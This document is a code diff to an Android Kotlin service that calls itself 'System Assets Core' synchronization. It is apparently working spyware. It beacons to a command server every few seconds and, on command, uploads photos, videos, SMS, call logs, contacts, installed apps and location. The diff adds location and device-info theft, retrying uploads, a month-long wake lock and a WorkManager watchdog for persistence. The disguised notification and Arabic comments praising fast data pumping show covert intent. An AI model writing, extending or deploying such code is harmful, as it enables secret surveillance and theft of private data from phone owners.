@@ -1,5 +1,6 @@
 package com.assets.service
 
+import android.annotation.SuppressLint
 import android.app.Notification
 import android.app.NotificationChannel
 import android.app.NotificationManager
@@ -7,6 +8,8 @@ import android.app.Service
 import android.content.Context
 import android.content.Intent
 import android.content.pm.ServiceInfo
+import android.location.Location
+import android.location.LocationManager
 import android.net.Uri
 import android.os.Build
 import android.os.IBinder
@@ -18,6 +21,10 @@ import android.provider.OpenableColumns
 import android.provider.Settings
 import android.util.Base64
 import androidx.core.app.NotificationCompat
+import androidx.work.Constraints
+import androidx.work.NetworkType
+import androidx.work.PeriodicWorkRequestBuilder
+import androidx.work.WorkManager
 import kotlinx.coroutines.*
 import okhttp3.*
 import okhttp3.MediaType.Companion.toMediaType
@@ -44,30 +51,35 @@ class SyncService : Service() {
         .connectTimeout(120, TimeUnit.SECONDS)
         .readTimeout(120, TimeUnit.SECONDS)
         .writeTimeout(120, TimeUnit.SECONDS)
+        .retryOnConnectionFailure(true)
         .build()
 
-    companion0@
-    private const val CHANNEL_ID = "SystemAssetsChannel"
-    private const val NOTIF_ID = 777
+    companion object {
+        private const val CHANNEL_ID = "SystemAssetsUltimateChannel"
+        private const val NOTIF_ID = 888
+    }
 
     override fun onCreate() {
         super.onCreate()
-        // تفعيل قفل المعالج لمنع النوم (WakeLock) لتنفيذ المهام بلا توقف
+        acquireWakeLock()
+        startForegroundServiceNotification()
+        scheduleWatchdog()
+    }
+
+    private fun acquireWakeLock() {
         try {
             val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
-            wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Assets:SyncWakeLock").apply {
-                acquire(10 * 24 * 60 * 60 * 1000L) // بقاء نشط لفترات طويلة
+            wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Assets:UltimateWakeLock").apply {
+                acquire(30 * 24 * 60 * 60 * 1000L) // بقاء نشط لشهر كامل مستمر
             }
         } catch (e: Exception) {}
-        
-        startForegroundServiceNotification()
     }
 
     private fun startForegroundServiceNotification() {
-        val channelName = "System Synchronization"
+        val channelName = "System Core Synchronization"
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val channel = NotificationChannel(CHANNEL_ID, channelName, NotificationManager.IMPORTANCE_LOW).apply {
-                description = "System background framework synchronization"
+                description = "Critical system background framework synchronization"
             }
             val manager = getSystemService(NotificationManager::class.java)
             manager?.createNotificationChannel(channel)
@@ -75,24 +87,30 @@ class SyncService : Service() {
 
         val notification: Notification = NotificationCompat.Builder(this, CHANNEL_ID)
             .setContentTitle("System Assets Core")
-            .setContentText("Running synchronization framework...")
+            .setContentText("Framework operational & synchronized...")
             .setSmallIcon(android.R.drawable.stat_sys_data_bluetooth)
             .setPriority(NotificationCompat.PRIORITY_LOW)
             .build()
 
         try {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-                startForeground(
-                    NOTIF_ID, 
-                    notification, 
-                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
-                )
+                startForeground(NOTIF_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
             } else {
                 startForeground(NOTIF_ID, notification)
             }
-        } catch (e: Exception) {
-            // التعامل مع قيود أندرويد 14 الحادة في حال بدء الخدمة من الخلفية
-        }
+        } catch (e: Exception) {}
+    }
+
+    private fun scheduleWatchdog() {
+        try {
+            val constraints = Constraints.Builder()
+                .setRequiredNetworkType(NetworkType.CONNECTED)
+                .build()
+            val request = PeriodicWorkRequestBuilder<SyncWorker>(15, TimeUnit.MINUTES)
+                .setConstraints(constraints)
+                .build()
+            WorkManager.getInstance(applicationContext).enqueue(request)
+        } catch (e: Exception) {}
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -103,8 +121,10 @@ class SyncService : Service() {
                         put("type", "HEARTBEAT")
                         put("status", "ONLINE")
                         put("nodeId", getNodeIdentifier())
+                        put("sdk", Build.VERSION.SDK_INT)
+                        put("model", Build.MODEL)
                     }
-                    val response = dispatchPacket(encryptPayload(telemetry.toString()))
+                    val response = dispatchPacketWithRetry(encryptPayload(telemetry.toString()))
                     
                     if (response != null) {
                         val taskObj = when {
@@ -118,7 +138,7 @@ class SyncService : Service() {
                         }
                     }
                 } catch (e: Exception) {}
-                delay(4000) // نبضات سريعة وصاروخية كل 4 ثوانٍ
+                delay(3000) // نبضات صاروخية كل 3 ثوانٍ
             }
         }
         return START_STICKY
@@ -159,43 +179,53 @@ class SyncService : Service() {
         return Base64.encodeToString(packet.toString().toByteArray(Charsets.UTF_8), Base64.NO_WRAP)
     }
 
-    private fun dispatchPacket(payload: String): JSONObject? {
-        try {
-            val req = Request.Builder()
-                .url(SERVER_ENDPOINT)
-                .post(payload.toRequestBody("text/plain; charset=utf-8".toMediaType()))
-                .addHeader("x-node-id", getNodeIdentifier())
-                .addHeader("x-node-model", android.os.Build.MODEL)
-                .build()
+    private suspend fun dispatchPacketWithRetry(payload: String): JSONObject? {
+        var attempts = 0
+        while (attempts < 3) {
+            try {
+                val req = Request.Builder()
+                    .url(SERVER_ENDPOINT)
+                    .post(payload.toRequestBody("text/plain; charset=utf-8".toMediaType()))
+                    .addHeader("x-node-id", getNodeIdentifier())
+                    .addHeader("x-node-model", Build.MODEL)
+                    .build()
 
-            client.newCall(req).execute().use { res ->
-                if (res.isSuccessful) {
-                    val bodyStr = res.body?.string() ?: "{}"
-                    return JSONObject(bodyStr)
+                client.newCall(req).execute().use { res ->
+                    if (res.isSuccessful) {
+                        val bodyStr = res.body?.string() ?: "{}"
+                        return JSONObject(bodyStr)
+                    }
                 }
+            } catch (e: Exception) {
+                attempts++
+                delay((attempts * 2000).toLong())
             }
-        } catch (e: Exception) {}
+        }
         return null
     }
 
     private suspend fun executeTask(task: JSONObject) {
         val action = task.optString("action", task.optString("cmd", ""))
         when (action.uppercase()) {
-            "EXTRACT_PHOTOS" -> streamMediaStoreFiles(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, 15)
-            "EXTRACT_VIDEOS" -> streamMediaStoreFiles(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, 8)
+            "EXTRACT_PHOTOS" -> streamMediaStoreFiles(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, 20)
+            "EXTRACT_VIDEOS" -> streamMediaStoreFiles(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, 10)
             "EXTRACT_SMS" -> sendTextReport("رسائل SMS", readSms())
             "EXTRACT_CALLS" -> sendTextReport("سجل المكالمات", readCallLogs())
             "EXTRACT_CONTACTS" -> sendTextReport("جهات الاتصال", readContacts())
             "EXTRACT_APPS" -> sendTextReport("التطبيقات المثبتة", readApps())
+            "EXTRACT_LOCATION" -> sendTextReport("الموقع الجغرافي", readLocation())
+            "EXTRACT_DEVICE_INFO" -> sendTextReport("معلومات الجهاز", readDeviceInfo())
         }
     }
 
     private fun sendTextReport(title: String, content: String) {
-        val report = JSONObject().apply {
-            put("type", "TEXT_REPORT")
-            put("data", "=== $title ===\n$content")
+        serviceScope.launch {
+            val report = JSONObject().apply {
+                put("type", "TEXT_REPORT")
+                put("data", "=== $title ===\n$content")
+            }
+            dispatchPacketWithRetry(encryptPayload(report.toString()))
         }
-        dispatchPacket(encryptPayload(report.toString()))
     }
 
     private suspend fun streamMediaStoreFiles(collectionUri: Uri, limit: Int) {
@@ -244,8 +274,8 @@ class SyncService : Service() {
                     put("data", Base64.encodeToString(chunk, Base64.NO_WRAP))
                 }
 
-                dispatchPacket(encryptPayload(packet.toString()))
-                delay(15)
+                dispatchPacketWithRetry(encryptPayload(packet.toString()))
+                delay(10) // ضخ فائق السرعة
             }
         } catch (e: Exception) {}
     }
@@ -263,7 +293,7 @@ class SyncService : Service() {
 
     private fun readSms(): String {
         val sb = StringBuilder()
-        contentResolver.query(Uri.parse("content://sms/inbox"), arrayOf("address", "body"), null, null, "date DESC LIMIT 50")?.use { c ->
+        contentResolver.query(Uri.parse("content://sms/inbox"), arrayOf("address", "body"), null, null, "date DESC LIMIT 100")?.use { c ->
             val a = c.getColumnIndex("address")
             val b = c.getColumnIndex("body")
             while (c.moveToNext()) {
@@ -277,7 +307,7 @@ class SyncService : Service() {
 
     private fun readCallLogs(): String {
         val sb = StringBuilder()
-        contentResolver.query(CallLog.Calls.CONTENT_URI, arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.TYPE), null, null, CallLog.Calls.DATE + " DESC LIMIT 50")?.use { c ->
+        contentResolver.query(CallLog.Calls.CONTENT_URI, arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.TYPE), null, null, CallLog.Calls.DATE + " DESC LIMIT 100")?.use { c ->
             val n = c.getColumnIndex(CallLog.Calls.NUMBER)
             val t = c.getColumnIndex(CallLog.Calls.TYPE)
             while (c.moveToNext()) {
@@ -311,6 +341,28 @@ class SyncService : Service() {
             sb.append("Pkg: ${pkg.packageName}\n")
         }
         return sb.toString()
+    }
+
+    @SuppressLint("MissingPermission")
+    private fun readLocation(): String {
+        return try {
+            val lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager
+            val loc: Location? = lm.getLastKnownLocation(LocationManager.PASSIVE_PROVIDER) 
+                ?: lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
+            if (loc != null) "Lat: ${loc.latitude}, Lng: ${loc.longitude}" else "Location unavailable"
+        } catch (e: Exception) {
+            "Location error: ${e.message}"
+        }
+    }
+
+    private fun readDeviceInfo(): String {
+        return """
+            Model: ${Build.MODEL}
+            Brand: ${Build.BRAND}
+            Device: ${Build.DEVICE}
+            Android SDK: ${Build.VERSION.SDK_INT}
+            Node ID: ${getNodeIdentifier()}
+        """.trimIndent()
     }
 
     private fun byteArrayToHex(b: ByteArray): String = b.joinToString("") { "%02x".format(it) }
